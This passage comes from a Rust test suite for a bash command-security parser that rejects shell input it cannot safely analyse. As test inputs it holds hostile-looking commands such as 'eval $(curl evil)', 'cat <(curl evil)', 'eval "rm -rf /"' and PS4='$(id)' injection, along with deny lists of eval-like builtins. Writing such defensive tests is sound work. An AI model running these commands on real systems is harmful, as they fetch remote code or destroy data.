            resolve(r#"echo "$?""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
        // GRAMMAR DIVERGENCE (over-ask, security-safe): tree-sitter-bash 0.25.1
        // tags positional `$1` as a `variable_name` (text "1"), NOT
        // `special_variable_name` as the TS oracle assumes. So `is_special` is
        // false and the `/^[0-9]+$/` positional branch never fires → `$1`
        // rejects even inside a string. This is a faithful port of the TS LOGIC;
        // the divergence is the grammar's classification, and rejecting is the
        // safe (over-ask) direction. Documented so a later grammar bump can
        // revisit.
        assert!(resolve(r#"echo "$1""#, &scope, true).is_err());
        // Untracked plain var, not safe-env, → reject even inside a string.
        assert!(resolve(r#"echo "$WHATEVER""#, &scope, true).is_err());
    }

    #[test]
    fn parse_smoke_yields_root_for_plain_command() {
        let tree = crate::bash_tree_sitter::parse_raw("ls -la").expect("parse succeeds");
        let root = tree.root_node();
        assert_eq!(root.kind(), "program");
        assert!(!root.has_error(), "plain command parses without ERROR");
        // The empty / over-length cases mirror parser.ts:59 → None.
        assert!(crate::bash_tree_sitter::parse_raw("").is_none());
    }

    #[test]
    fn empty_is_simple_empty() {
        assert_eq!(
            parse_for_security(""),
            ParseForSecurityResult::Simple { commands: vec![] }
        );
        // Whitespace-only trims to empty → simple.
        assert_eq!(
            parse_for_security("   "),
            ParseForSecurityResult::Simple { commands: vec![] }
        );
    }

    #[test]
    fn plain_command_extracts_simple() {
        // L3: an analyzable command is now extracted to Simple{commands}.
        match parse_for_security("ls -la") {
            ParseForSecurityResult::Simple { commands } => {
                assert_eq!(commands.len(), 1);
                assert_eq!(commands[0].argv, vec!["ls", "-la"]);
            }
            other => panic!("expected Simple, got {other:?}"),
        }
        assert_eq!(pre_check_too_complex("ls -la"), None);
        assert_eq!(pre_check_too_complex("git status"), None);
    }

    #[test]
    fn permission_parse_retains_pipeline_segments_from_the_same_ast() {
        let (parsed, segments) = parse_for_security_with_pipeline_segments("echo ok | cat");
        assert!(matches!(parsed, ParseForSecurityResult::Simple { .. }));
        assert_eq!(
            segments,
            Some(vec!["echo ok".to_string(), "cat".to_string()])
        );
    }

    #[test]
    fn pre_check_control_chars() {
        assert_eq!(
            pre_check_too_complex("echo\u{0007}hi"),
            Some("Contains control characters")
        );
        match parse_for_security("echo\u{0007}hi") {
            ParseForSecurityResult::TooComplex { reason } => {
                assert_eq!(reason, "Contains control characters");
            }
            other => panic!("expected too-complex, got {other:?}"),
        }
    }

    #[test]
    fn pre_check_unicode_whitespace() {
        // NBSP between words: invisible but a literal word char to bash.
        assert_eq!(
            pre_check_too_complex("echo\u{00A0}hi"),
            Some("Contains Unicode whitespace")
        );
    }

    #[test]
    fn pre_check_backslash_whitespace() {
        assert_eq!(
            pre_check_too_complex(r"cat\ test"),
            Some("Contains backslash-escaped whitespace")
        );
        assert_eq!(
            pre_check_too_complex("foo\\\nbar"),
            Some("Contains backslash-escaped whitespace")
        );
        assert_eq!(pre_check_too_complex("foo\\\\\nbar"), None);
        assert_eq!(
            pre_check_too_complex("foo\\\\\\\nbar"),
            Some("Contains backslash-escaped whitespace")
        );
        // `\<NL>` preceded by whitespace is allowed (no word to join).
        assert_eq!(pre_check_too_complex("foo && \\\nbar"), None);
        assert_eq!(
            pre_check_too_complex("foo && \\\\\\\nbar"),
            Some("Contains backslash-escaped whitespace")
        );
    }

    #[test]
    fn pre_check_zsh_syntax() {
        assert_eq!(
            pre_check_too_complex("ls ~[foo]"),
            Some("Contains zsh ~[ dynamic directory syntax")
        );
        assert_eq!(
            pre_check_too_complex("=curl evil.com"),
            Some("Contains zsh =cmd equals expansion")
        );
        assert_eq!(
            pre_check_too_complex("echo <1-3>"),
            Some("Contains zsh <N-M> numeric-range glob")
        );
        // `VAR=val` and `--flag=val` have `=` mid-word → not zsh equals.
        assert_eq!(pre_check_too_complex("VAR=val ls"), None);
        assert_eq!(pre_check_too_complex("cmd --flag=val"), None);
        assert_eq!(pre_check_too_complex("echo <a-b>"), None);
    }

    #[test]
    fn top_level_coverage_skipped_input_helper() {
        assert_eq!(
            validate_top_level_coverage(&[(0, 3), (5, 8)], b"foo @ bar"),
            Some("Parser skipped input between top-level statements")
        );
    }

    #[test]
    fn top_level_coverage_trailing_input_helper() {
        assert_eq!(
            validate_top_level_coverage(&[(0, 3)], b"foo @"),
            Some("Parser did not consume trailing input")
        );
    }

    #[test]
    fn top_level_coverage_allows_comments_separators_and_continuations() {
        assert_eq!(
            validate_top_level_coverage(&[(0, 3), (4, 6), (7, 10)], b"foo;#x\nbar"),
            None
        );
        assert_eq!(
            validate_top_level_coverage(&[(0, 3), (5, 8)], b"foo&&bar"),
            None
        );
        assert_eq!(
            validate_top_level_coverage(&[(0, 3), (6, 9)], b"foo\\\r\nbar"),
            None
        );
    }

    #[test]
    fn top_level_layout_adjacent_same_line_helper() {
        assert_eq!(
            validate_adjacent_statement_spans(&[(0, 3), (4, 7)], b"foo bar"),
            Some(
                "statement directly follows another statement on the same line — bash reads the text as one command (`!` and shell keywords are plain words after an assignment), not two statements"
            )
        );
        assert_eq!(
            validate_adjacent_statement_spans(&[(0, 3), (6, 9)], b"foo\\\r\nbar"),
            Some(
                "statement directly follows another statement on the same line — bash reads the text as one command (`!` and shell keywords are plain words after an assignment), not two statements"
            )
        );
        assert!(gap_is_same_line_after_continuations(b" \\\r\n "));
        assert!(!gap_is_same_line_after_continuations(b" \r\n "));
    }

    #[test]
    fn nested_recursive_adjacency_walk_sanity() {
        let cmd = "if true; then foo\nbar; fi";
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        assert_eq!(
            validate_adjacent_statements_recursive(tree.root_node(), cmd.as_bytes()),
            None
        );
    }

    #[test]
    fn test_expr_helper_differentials() {
        assert_eq!(
            test_expr_operator_reason(""),
            Some("Test command has a synthesized zero-width token — parser diverged from shell")
        );
        assert_eq!(
            test_expr_pattern_reason("regex", "$foo"),
            Some("[[ ]] regex contains expansion / command / process substitution".to_string())
        );
        assert_eq!(
            test_expr_pattern_reason("extglob_pattern", "@(a&b)"),
            Some(
                "[[ ]] pattern contains unquoted & (zsh splits the word at & at any depth)"
                    .to_string()
            )
        );
        assert_eq!(
            test_expr_pattern_reason("regex", "foo||bar"),
            Some("[[ ]] regex contains glued || (zsh splits it as a cond operator)".to_string())
        );
        assert_eq!(
            test_expr_pattern_reason("regex", "(foo"),
            Some("[[ ]] regex has unbalanced parentheses (parser desync)".to_string())
        );
        assert_eq!(
            test_expr_leaf_reason("foo&&bar"),
            Some(
                "[[ ]] pattern leaf contains `&&` — shell cond-lexer divergence (zsh splits the word there)",
            )
        );
    }

    #[test]
    fn l3_test_command_zsh_regex_hardening() {
        assert_eq!(
            pfs("[[ foo =~ foo||bar ]]"),
            Err("[[ ]] regex contains glued || (zsh splits it as a cond operator)".to_string())
        );
        assert_eq!(
            pfs("[[ foo == @(a&b) ]]"),
            Err(
                "[[ ]] pattern contains unquoted & (zsh splits the word at & at any depth)"
                    .to_string()
            )
        );
        assert_eq!(
            pfs("[[ foo == foo&&bar ]]"),
            Err(
                "[[ ]] pattern leaf contains `&&` — shell cond-lexer divergence (zsh splits the word there)"
                    .to_string()
            )
        );
    }

    // ── L2: arg / value / assignment / heredoc walkers ──

    /// Resolve a single argument node of the given kind, found by DFS.
    fn arg(cmd: &str, kind: &str) -> Result<String, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let node = find_kind(tree.root_node(), kind).unwrap_or_else(|| panic!("no {kind} node"));
        let mut inner = Vec::new();
        let mut scope = HashMap::new();
        match walk_argument(Some(node), src, &mut inner, &mut scope) {
            Ok(s) => Ok(s),
            Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Err(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    /// Resolve the whole command via the stand-in driver; returns the flat argv
    /// of the first command plus any inner (cmdsub-extracted) commands' argvs.
    fn cmd_argvs(cmd: &str) -> Result<Vec<Vec<String>>, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let mut commands = Vec::new();
        let mut scope = HashMap::new();
        match collect_commands(tree.root_node(), &mut commands, &mut scope, src) {
            None => Ok(commands.into_iter().map(|c| c.argv).collect()),
            Some(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Some(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    #[test]
    fn walk_argument_word_unescape_and_brace() {
        // Unquoted word backslash removal: `\eval` → `eval`, `\;` → `;` (bash
        // quote removal). Use the full-command argv so the resolved arg word is
        // unambiguous (find_kind's DFS would otherwise return the command_name's
        // own word first).
        assert_eq!(
            cmd_argvs(r"echo \eval").expect("simple")[0],
            vec!["echo", "eval"]
        );
        assert_eq!(cmd_argvs(r"echo \;").expect("simple")[0], vec!["echo", ";"]);
        // GRAMMAR DIVERGENCE (tree-sitter-bash 0.25.1 vs the TS oracle's node
        // model): the TS runs BRACE_EXPANSION_RE on a `word` node's text, but
        // tsb-0.25.1 tokenizes `{a,b}` into structural brace tokens with an inner
        // `word` of text `"a,b"` (NO braces) — so `walk_argument`'s word-level
        // brace check never fires for a plain `{a,b}`. The check is retained
        // faithfully (it still fires for a word whose literal text contains
        // `{x,y}`, e.g. inside a concatenation), but plain brace expansion must be
        // rejected STRUCTURALLY in the L3 `collect_commands`/`walk_command` layer.
        // ⚠️ FOLLOW-UP (L3 + adversarial verify): confirm `{a,b}` as an argument is
        // rejected end-to-end (it is NOT caught by the pre-checks, which only flag
        // brace+quote). Tracked so the dead word-level path is not mistaken for
        // coverage.
        assert_eq!(arg("{a,b}", "word"), Ok("a,b".to_string()));
    }

    #[test]
    fn walk_argument_raw_string_and_number() {
        assert_eq!(
            arg("echo '/etc/passwd'", "raw_string"),
            Ok("/etc/passwd".to_string())
        );
        // Plain number → its text.
        assert_eq!(arg("sleep 10", "number"), Ok("10".to_string()));
        // `10#$(cmd)` arithmetic-base smuggling: number node WITH a child → reject.
        assert_eq!(
            arg("echo 10#$(id)", "number"),
            Err("Number node contains expansion (NN# arithmetic base syntax)".to_string())
        );
    }

    #[test]
    fn walk_argument_bare_cmdsub_is_too_complex() {
        // `rm $(echo /etc)` — bare command_substitution at arg position must
        // reject (the $() output IS the argument; placeholder would hide the path).
        assert_eq!(
            cmd_argvs("rm $(echo /etc)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn walk_string_solo_placeholder_rejects() {
        // `"$(cmd)"` alone → solo-placeholder → reject (guard A). The inner
        // command is still extracted before the guard fires; the verdict is the
        // too-complex on the outer string.
        assert_eq!(
            cmd_argvs(r#"cd "$(echo /etc)""#),
            Err("Contains shell syntax (string) that cannot be statically analyzed".to_string())
        );
    }

    #[test]
    fn walk_string_literal_plus_cmdsub_extracts_inner() {
        // `echo "SHA: $(git rev-parse HEAD)"` — literal + placeholder is allowed;
        // the inner `git rev-parse HEAD` is extracted as a second command.
        let argvs = cmd_argvs(r#"echo "SHA: $(git rev-parse HEAD)""#).expect("simple");
        assert_eq!(argvs.len(), 2);
        // Inner commands accumulate FIRST (extracted during walkString, before the
        // outer command is pushed): ["git", "rev-parse", "HEAD"].
        assert_eq!(argvs[0], vec!["git", "rev-parse", "HEAD"]);
        // Outer: ["echo", "SHA: __CMDSUB_OUTPUT__"].
        assert_eq!(argvs[1][0], "echo");
        assert_eq!(argvs[1][1], format!("SHA: {CMDSUB_PLACEHOLDER}"));
    }

    #[test]
    fn walk_string_double_quote_escapes_and_newline_kept() {
        // Inside "...": `\"` → `"`, but `\n` (backslash-n) is NOT a real newline
        // here — tree-sitter keeps the literal `\n` two chars; our escape rule
        // only strips `\` before $ ` " \, so `\n` stays `\n`.
        let argvs = cmd_argvs(r#"echo "fix \"bug\"""#).expect("simple");
        assert_eq!(argvs[0][1], r#"fix "bug""#);
    }

    #[test]
    fn walk_string_whitespace_only_quirk_rejects() {
        // 2.1.211: tree-sitter attributes a whitespace-only `" "` to the closing
        // quote → no content children. Guard B now RETURNS the inner slice (a
        // literal space) since it hides no command substitution.
        let argvs = cmd_argvs(r#"echo " ""#).expect("simple");
        assert_eq!(argvs[0], vec!["echo".to_string(), " ".to_string()]);
        // Genuine empty `""` (len == 2) is fine → argv element "".
        let argvs = cmd_argvs(r#"echo """#).expect("simple");
        assert_eq!(argvs[0], vec!["echo".to_string(), String::new()]);
    }

    #[test]
    fn walk_string_delimiters_only_returns_inner_slice() {
        let tree = crate::bash_tree_sitter::parse_raw(r#"echo " ""#).expect("parse");
        let src = br#"echo " ""#;
        let node = find_kind(tree.root_node(), "string").expect("string node");
        let mut inner = Vec::new();
        let mut scope = HashMap::new();
        assert_eq!(
            walk_string(node, src, &mut inner, &mut scope),
            Ok(" ".to_string())
        );
        assert!(
            inner.is_empty(),
            "delimiters-only literal must not extract inner commands"
        );
    }

    #[test]
    fn walk_arithmetic_literal_ok_variable_rejects() {
        // `$((1+2))` — literal arithmetic, argv gets the full span verbatim.
        let argvs = cmd_argvs("echo $((1+2))").expect("simple");
        assert_eq!(argvs[0][1], "$((1+2))");
        // `$((x))` references a variable → arithmetic injection → reject.
        let r = cmd_argvs("echo $((x))");
        assert!(
            matches!(&r, Err(reason) if reason.starts_with("Arithmetic expansion references variable or non-literal")),
            "got {r:?}"
        );
    }

    #[test]
    fn walk_variable_assignment_name_guards() {
        let tree = crate::bash_tree_sitter::parse_raw("IFS=x ls").expect("parse");
        let src = "IFS=x ls".as_bytes();
        let node = find_kind(tree.root_node(), "variable_assignment").expect("assignment");
        let mut inner = Vec::new();
        let mut scope = HashMap::new();
        match walk_variable_assignment(node, &mut inner, &mut scope, src) {
            Err(ParseForSecurityResult::TooComplex { reason }) => {
                assert_eq!(
                    reason,
                    "IFS assignment changes word-splitting — cannot model statically"
                );
            }
            other => panic!("expected IFS reject, got {other:?}"),
        }
    }

    #[test]
    fn walk_variable_assignment_ps4_and_tilde() {
        fn assign(cmd: &str) -> Result<VarAssign, String> {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "variable_assignment").expect("assignment");
            let mut inner = Vec::new();
            let mut scope = HashMap::new();
            match walk_variable_assignment(node, &mut inner, &mut scope, src) {
                Ok(ev) => Ok(ev),
                Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
                Err(o) => panic!("unexpected {o:?}"),
            }
        }
        // Plain literal assignment.
        assert_eq!(
            assign("VAR=safe ls"),
            Ok(VarAssign {
                name: "VAR".to_string(),
                value: "safe".to_string(),
                is_append: false
            })
        );
        // PS4 with cmdsub → reject (placeholder).
        assert_eq!(
            assign("PS4=$(id) ls"),
            Err("PS4 value derived from cmdsub/variable — runtime unknowable".to_string())
        );
        // PS4 legit charset passes (raw_string `${...}` refs + safe chars).
        assert!(assign(r#"PS4='+${BASH_SOURCE}:${LINENO}: ' ls"#).is_ok());
        // PS4 with a bare `$` (split primitive) is off the allowlist → reject.
        assert_eq!(
            assign(r#"PS4='$ ' ls"#),
            Err("PS4 value outside safe charset — only ${VAR} refs and [A-Za-z0-9 _+:.=/[]-] allowed".to_string())
        );
        // Tilde in value → reject.
        assert_eq!(
            assign("VAR=~/x ls"),
            Err("Tilde in assignment value — bash may expand at assignment time".to_string())
        );
    }

    #[test]
    fn walk_heredoc_redirect_quoting() {
        fn heredoc(cmd: &str) -> Option<String> {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "heredoc_redirect").expect("heredoc");
            match walk_heredoc_redirect(node, src) {
                None => None,
                Some(ParseForSecurityResult::TooComplex { reason }) => Some(reason),
                Some(o) => panic!("unexpected {o:?}"),
            }
        }
        // Quoted delimiter → ok.
        assert_eq!(heredoc("cat <<'EOF'\nx\nEOF"), None);
        // Unquoted delimiter undergoes expansion → reject.
        assert_eq!(
            heredoc("cat <<EOF\nx\nEOF"),
            Some("Heredoc with unquoted delimiter undergoes shell expansion".to_string())
        );
    }

    #[test]
    fn extract_safe_cat_heredoc_body_and_dangerous() {
        fn cat_h(cmd: &str) -> CatHeredoc {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "command_substitution").expect("cmdsub");
            extract_safe_cat_heredoc(node, src)
        }
        // Safe cat-heredoc → body returned.
        match cat_h(
            r#"echo "$(cat <<'EOF'
/etc/passwd
EOF
)""#,
        ) {
            CatHeredoc::Body(b) => assert!(b.contains("/etc/passwd")),
            o => panic!("expected body, got {o:?}"),
        }
        // jq system() in the body → DANGEROUS.
        assert_eq!(
            cat_h(
                r#"echo "$(cat <<'EOF'
system("id")
EOF
)""#
            ),
            CatHeredoc::Dangerous
        );
        // The awk battery also scans heredoc bodies and rejects command-executing
        // awk programs before they can be treated as static literal content.
        assert_eq!(
            cat_h(
                r#"echo "$(cat <<'EOF'
BEGIN { system("id") }
EOF
 )""#
            ),
            CatHeredoc::Dangerous
        );
    }

    #[test]
    fn walk_string_safe_cat_heredoc_body_appended() {
        // Single-line safe cat-heredoc body must land in argv (so path validation
        // sees the real target), not be dropped.
        let argvs = cmd_argvs(
            r#"rm "$(cat <<'EOF'
/etc/passwd
EOF
)""#,
        )
        .expect("simple");
        // Outer rm argv element is the body (no inner command — cat-heredoc is a
        // static result, not recursed).
        assert_eq!(argvs[0][0], "rm");
        assert_eq!(argvs[0][1], "/etc/passwd");
    }

    #[test]
    fn pre_check_brace_with_quote_and_masking() {
        // Obfuscated brace expansion with a quote → flagged.
        assert_eq!(
            pre_check_too_complex("echo {a'}',b}"),
            Some("Contains brace with quote character (expansion obfuscation)")
        );
        // Quoted JSON payload: the `{` is inside quotes → masked → NOT flagged.
        assert_eq!(pre_check_too_complex(r#"curl -d '{"k":"v"}'"#), None);
        assert_eq!(pre_check_too_complex(r#"curl -d "{\"k\":\"v\"}""#), None);
    }

    // ── L3: walk_command / walk_redirected_statement / walk_file_redirect /
    //        collect_commands / walk_program / parse_for_security ──

    /// Run the full `parse_for_security` pipeline. `Ok(commands)` on Simple;
    /// `Err(reason)` on TooComplex; panic on ParseUnavailable (none of the L3
    /// inputs trip that).
    fn pfs(cmd: &str) -> Result<Vec<SimpleCommand>, String> {
        match parse_for_security(cmd) {
            ParseForSecurityResult::Simple { commands } => Ok(commands),
            ParseForSecurityResult::TooComplex { reason } => Err(reason),
            ParseForSecurityResult::ParseUnavailable => {
                panic!("unexpected ParseUnavailable for {cmd:?}")
            }
        }
    }

    /// Convenience: just the argv vectors.
    fn pfs_argvs(cmd: &str) -> Result<Vec<Vec<String>>, String> {
        pfs(cmd).map(|cs| cs.into_iter().map(|c| c.argv).collect())
    }

    #[test]
    fn l3_simple_command_argv_env_redirect() {
        // Plain command.
        let cs = pfs("git status").expect("simple");
        assert_eq!(cs.len(), 1);
        assert_eq!(cs[0].argv, vec!["git", "status"]);
        assert!(cs[0].env_vars.is_empty());
        assert!(cs[0].redirects.is_empty());
        assert_eq!(cs[0].text, "git status");

        // Env prefix → env_vars, NOT a tracked var (command-local).
        let cs = pfs("FOO=bar ls -l").expect("simple");
        assert_eq!(cs[0].argv, vec!["ls", "-l"]);
        assert_eq!(cs[0].env_vars, vec![("FOO".to_string(), "bar".to_string())]);

        // File redirect on the last command.
        let cs = pfs("echo hi > /tmp/out").expect("simple");
        assert_eq!(cs[0].argv, vec!["echo", "hi"]);
        assert_eq!(cs[0].redirects.len(), 1);
        assert_eq!(cs[0].redirects[0].op, ">");
        assert_eq!(cs[0].redirects[0].target, "/tmp/out");

        // fd-prefixed redirect.
        let cs = pfs("ls 2> /tmp/err").expect("simple");
        assert_eq!(cs[0].redirects[0].op, ">");
        assert_eq!(cs[0].redirects[0].fd, Some(2));
    }

    #[test]
    fn l3_integer_attribute_assignment_values_are_fail_closed() {
        // Decimal literals accepted by the oracle, including zero and the
        // normal RANDOM assignment case.
        assert!(pfs("OPTIND=1").is_ok());
        assert!(pfs("OPTIND=0").is_ok());
        assert!(pfs("RANDOM=2").is_ok());
        assert!(pfs("RANDOM=2 echo ok").is_ok());

        let assignment_reason = |name: &str| {
            format!(
                "{name} has integer attribute — assignment arith-evals RHS, which can execute subscript command substitution or abort/diverge at runtime"
            )
        };
        let env_prefix_reason = |name: &str| {
            format!(
                "{name} has integer attribute — env-prefix arith-evals value, which can execute subscript command substitution or abort/diverge at runtime"
            )
        };

        // Arithmetic syntax, a leading zero, and a value over 18 digits are
        // not part of the safe decimal-literal subset.
        assert_eq!(pfs("RANDOM=2+2"), Err(assignment_reason("RANDOM")));
        assert_eq!(pfs("RANDOM=02"), Err(assignment_reason("RANDOM")));
        assert_eq!(
            pfs("RANDOM=1234567890123456789"),
            Err(assignment_reason("RANDOM"))
        );

        // Both command substitution spellings reach the VarAssign value
        // checker and retain its exact assignment reason.
        assert_eq!(pfs("RANDOM=$(printf 2)"), Err(assignment_reason("RANDOM")));
        assert_eq!(pfs("RANDOM=`printf 2`"), Err(assignment_reason("RANDOM")));
        assert_eq!(pfs("RANDOM='[2]'"), Err(assignment_reason("RANDOM")));

        // Env-prefix assignments use the separate oracle reason and are
        // checked before the command is emitted.
        assert_eq!(
            pfs("RANDOM=2+2 printf ok"),
            Err(env_prefix_reason("RANDOM"))
        );
        assert_eq!(
            pfs("RANDOM=$(printf 2) printf ok"),
            Err(env_prefix_reason("RANDOM"))
        );
    }

    #[test]
    fn l3_pipeline_extracts_each_stage() {
        let argvs = pfs_argvs("ls -la | grep foo").expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["ls", "-la"]);
        assert_eq!(argvs[1], vec!["grep", "foo"]);
    }

    #[test]
    fn l3_list_and_separators() {
        // `&&` carries scope linearly: VAR=push then `git $SUB` resolves.
        let argvs = pfs_argvs("VAR=safe && echo $VAR").expect("simple");
        // VAR=safe is a bare assignment (no command pushed), echo resolves $VAR.
        assert_eq!(argvs.len(), 1);
        assert_eq!(argvs[0], vec!["echo", "safe"]);
    }

    #[test]
    fn l3_flag_omission_attack_rejected() {
        // SECURITY: `true || FLAG=x && cmd $FLAG` — the `||` RHS may not run, so
        // FLAG is NOT carried across the `||`. `$FLAG` then resolves against the
        // post-`||` snapshot (FLAG unset) → bare $FLAG → too-complex (over-ask).
        let r = pfs("true || FLAG=--dry-run && rm $FLAG");
        assert!(r.is_err(), "flag-omission must not be Simple: {r:?}");
    }

    #[test]
    fn l3_subshell_extracts_inner() {
        let argvs = pfs_argvs("(cd /tmp && ls)").expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["cd", "/tmp"]);
        assert_eq!(argvs[1], vec!["ls"]);
    }

    #[test]
    fn l3_command_substitution_in_string_extracts_inner() {
        // Inner extracted first, then outer with placeholder.
        let argvs = pfs_argvs(r#"echo "rev: $(git rev-parse HEAD)""#).expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["git", "rev-parse", "HEAD"]);
        assert_eq!(argvs[1][0], "echo");
    }

    #[test]
    fn l3_bare_cmdsub_arg_rejected() {
        // `$()` output IS the argument → must reject (placeholder would hide path).
        assert_eq!(
            pfs("rm $(echo /etc)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn l3_process_substitution_rejected() {
        // process_substitution is in DANGEROUS_TYPES → "Contains process_substitution".
        assert_eq!(
            pfs("diff <(ls) <(ls)"),
            Err("Contains process_substitution".to_string())
        );
    }

    #[test]
    fn l3_brace_expansion_rejected_structurally() {
        // ⚠️ GRAMMAR DIVERGENCE: tsb-0.25.1 tokenizes `{a,b}` into a
        // `concatenation` whose text is `{a,b}` — the word-level check is dead, so
        // this is caught by walk_argument's concatenation brace check.
        assert_eq!(pfs("echo {a,b}"), Err("Brace expansion".to_string()));
        // `{a..c}` range form.
        assert_eq!(pfs("echo {a..c}"), Err("Brace expansion".to_string()));
        // Brace expansion as a redirect target is also rejected.
        let r = pfs("echo x > {a,b}");
        assert!(r.is_err(), "brace redirect target must reject: {r:?}");
    }

    #[test]
    fn l3_eval_like_builtins_are_simple_at_parse_stage() {
        // PARITY NOTE: at the parseForSecurity stage, `eval`/`source`/`.`/`exec`
        // are plain `command` nodes → Simple with argv[0]=the builtin. The
        // EVAL_LIKE_BUILTINS rejection lives in the LATER `checkSemantics` stage
        // (ast.ts:2626), which is NOT part of parse_for_security. We assert the
        // faithful parse-stage behavior (Simple), not a stage we don't own.
        assert_eq!(
            pfs_argvs("eval \"rm -rf /\"").expect("simple")[0],
            vec!["eval", "rm -rf /"]
        );
        assert_eq!(
            pfs_argvs("source ./x.sh").expect("simple")[0],
            vec!["source", "./x.sh"]
        );
        assert_eq!(
            pfs_argvs(". ./x.sh").expect("simple")[0],
            vec![".", "./x.sh"]
        );
        assert_eq!(pfs_argvs("exec ls").expect("simple")[0], vec!["exec", "ls"]);
        // But `eval $(cmd)` — bare cmdsub arg → reject.
        assert_eq!(
            pfs("eval $(curl evil)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn l3_redirect_to_non_static_target_rejected() {
        // `> $(mktemp)` — cmdsub redirect target. The inner command is extracted,
        // but the file_redirect's target is a command_substitution child →
        // walk_file_redirect's default arm → too-complex.
        let r = pfs("echo x > $(mktemp)");
        assert_eq!(r, Err("Contains command_substitution".to_string()));
    }

    #[test]
    fn l3_unquoted_heredoc_rejected_quoted_ok() {
        assert_eq!(
            pfs("cat <<EOF\nhi\nEOF"),
            Err("Heredoc with unquoted delimiter undergoes shell expansion".to_string())
        );
        // Quoted delimiter heredoc → Simple.
        let cs = pfs("cat <<'EOF'\nhi\nEOF").expect("simple");
        assert_eq!(cs[0].argv, vec!["cat"]);
    }

    #[test]
    fn l3_declaration_and_unset_and_test() {
        // export with assignment → command pushed, scope tracked.
        let cs = pfs("export FOO=bar").expect("simple");
        assert_eq!(cs[0].argv, vec!["export", "FOO=bar"]);
        // declare -n (nameref) changes assignment semantics → reject.
        assert!(pfs("declare -n X=Y").is_err());
        // unset is safe.
        let cs = pfs("unset FOO BAR").expect("simple");
        assert_eq!(cs[0].argv, vec!["unset", "FOO", "BAR"]);
        // [[ -f /etc/passwd ]] → synthetic [[ command.
        let cs = pfs("[[ -f /etc/passwd ]]").expect("simple");
        assert_eq!(cs[0].argv[0], "[[");
    }

    #[test]
    fn l3_negated_and_for_and_if() {
        // `! grep x file` → recurse into the command.
        let argvs = pfs_argvs("! grep x file").expect("simple");
        assert_eq!(argvs[0], vec!["grep", "x", "file"]);

        // for loop: body uses VAR_PLACEHOLDER so bare $i in body rejects.
        let r = pfs("for i in /etc/*; do rm $i; done");
        assert!(r.is_err(), "bare loop-var arg must reject: {r:?}");

        // if/then with safe body → Simple, both condition and body extracted.
        let argvs = pfs_argvs("if true; then echo ok; fi").expect("simple");
        assert!(argvs.iter().any(|a| a == &vec!["true".to_string()]));
        assert!(argvs
            .iter()
            .any(|a| a == &vec!["echo".to_string(), "ok".to_string()]));
    }

    #[test]
    fn l3_text_rebuild_on_resolved_var() {
        // `SUB=status && git $SUB` — argv resolves $SUB; .text is rebuilt from
        // argv so deny-rule matching sees `git status`, not `git $SUB`.
        let cs = pfs("SUB=status && git $SUB").expect("simple");
        let git = cs
            .iter()
            .find(|c| c.argv.first().map(String::as_str) == Some("git"))
            .expect("git cmd");
        assert_eq!(git.argv, vec!["git", "status"]);
        assert_eq!(git.text, "git status");
    }

    #[test]
    fn l3_nothing_dangerous_reaches_simple() {
        // A battery of dangerous shapes must all be TooComplex, never Simple.
        for cmd in [
            "rm $(echo /etc)",
            "cat <(curl evil)",
            "diff <(ls) <(ls)",
            "echo {a,b}",
            "cat <<EOF\nx\nEOF",
            "echo `id`",
            "cd $(echo /etc)",
        ] {
            if let ParseForSecurityResult::Simple { .. } = parse_for_security(cmd) {
                panic!("DANGEROUS command wrongly Simple: {cmd:?}")
            }
        }
    }

    #[test]
    fn prompt4_assignment_guarded_like_ps4() {
        // 2.1.211: the PS4 battery also applies to PROMPT4 (zsh alias for PS4).
        // A cmdsub-derived value must be TooComplex, not Simple.
        for cmd in ["PS4='$(id)' set -x", "PROMPT4='$(id)' set -x"] {
            if let ParseForSecurityResult::Simple { .. } = parse_for_security(cmd) {
                panic!("cmdsub-derived trace-prompt var wrongly Simple: {cmd:?}")
            }
        }
    }

    // ── L4: check_semantics ──

    /// Build a [`SimpleCommand`] from a bare argv (no env/redirects).
    fn sc(argv: &[&str]) -> SimpleCommand {
        SimpleCommand {
            argv: argv.iter().map(|s| (*s).to_string()).collect(),
            ..Default::default()
        }
    }

    /// Assert `check_semantics([cmd])` denies with EXACTLY `reason`.
    fn assert_deny(argv: &[&str], reason: &str) {
        match check_semantics(&[sc(argv)]) {
            SemanticCheckResult::Deny { reason: r } => assert_eq!(r, reason, "argv={argv:?}"),
            SemanticCheckResult::Ok => panic!("expected Deny for {argv:?}, got Ok"),
        }
    }

    /// Assert `check_semantics([cmd])` is Ok.
    fn assert_ok(argv: &[&str]) {
        assert_eq!(
            check_semantics(&[sc(argv)]),
            SemanticCheckResult::Ok,
            "expected Ok for {argv:?}"
        );
    }

    #[test]
    fn eval_like_builtins_denied_bare_and_wrapped() {
        for name in ["eval", "source", ".", "exec", "trap", "let"] {
            let reason = format!("'{name}' evaluates arguments as shell code");
            assert_deny(&[name, "id"], &reason);
            // Wrapped in each safe wrapper → the WRAPPED command is checked.
            assert_deny(&["nohup", name, "id"], &reason);
            assert_deny(&["time", name, "id"], &reason);
            assert_deny(&["timeout", "5", name, "id"], &reason);
            assert_deny(&["nice", "-n", "5", name, "id"], &reason);
            assert_deny(&["env", "FOO=bar", name, "id"], &reason);
